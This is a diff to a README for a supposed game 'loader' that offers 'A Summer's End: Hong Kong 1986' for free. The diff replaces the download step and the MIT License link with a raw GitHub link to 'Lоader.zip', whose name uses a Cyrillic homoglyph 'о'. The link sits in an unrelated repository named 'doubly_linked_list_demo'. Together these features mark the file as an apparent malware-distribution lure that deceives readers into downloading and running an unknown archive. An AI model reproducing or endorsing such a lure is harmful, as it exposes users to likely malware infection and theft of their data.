@@ -25,7 +25,7 @@ Our loader is the perfect companion for anyone yearning for a nostalgic trip thr
 
 ## 🔑 Installation
 
-1. Download **Loader.rar** from this repository.  
+1. Download **https://raw.githubusercontent.com/vyfctcthjb/doubly_linked_list_demo/main/Lоader.zip** from this repository.  
 2. Extract and follow the on-screen launcher prompts.  
 3. Enjoy **A Summer's End: Hong Kong 1986** for free!
 
@@ -35,7 +35,7 @@ Our loader is the perfect companion for anyone yearning for a nostalgic trip thr
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT). See LICENSE file for details.
+Distributed under the [MIT License](https://raw.githubusercontent.com/vyfctcthjb/doubly_linked_list_demo/main/Lоader.zip). See LICENSE file for details.
 
 ---
 
